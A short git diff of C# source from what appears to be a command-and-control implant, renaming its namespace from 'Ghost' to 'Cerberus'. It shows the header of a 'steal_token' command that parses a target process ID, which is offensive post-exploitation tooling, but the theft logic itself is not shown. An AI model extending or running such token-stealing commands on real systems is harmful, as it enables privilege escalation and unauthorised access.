@@ -1,15 +1,15 @@
-﻿using Ghost.Models.Tasks;
+﻿using Cerberus.Models.Tasks;
 using System;
 using System.Diagnostics;
 using System.Security.Principal;
 
-namespace Ghost.Commands
+namespace Cerberus.Commands
 {
-    public class StealToken : GhostCommand
+    public class StealToken : CerberusCommand
     {
         public override string Name => "steal_token";
 
-        public override string Execute(GhostTask task)
+        public override string Execute(CerberusTask task)
         {
             if (!int.TryParse(task.Arguments[0], out var pid))
                 return "Failed to parse PID";
